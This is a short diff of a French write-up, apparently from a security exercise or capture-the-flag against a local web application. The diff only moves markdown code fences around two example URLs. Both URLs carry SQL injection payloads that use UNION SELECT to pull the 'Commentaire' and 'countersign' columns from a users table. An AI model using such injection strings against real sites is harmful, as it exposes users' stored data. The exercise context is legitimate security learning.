@@ -88,8 +88,8 @@ en fouillant dans chacune d'elle, on trouve que comment affiche ceci :
 
 ```url
     http://localhost:8080/index.php?page=member&Submit=Submit&id=0%20UNION%20SELECT%201,%20Commentaire%20FROM%20users
-```url
 ```
+```url
     http://localhost:8080/index.php?page=member&Submit=Submit&id=0%20UNION%20SELECT%201,%20countersign%20FROM%20users    
 ```
 
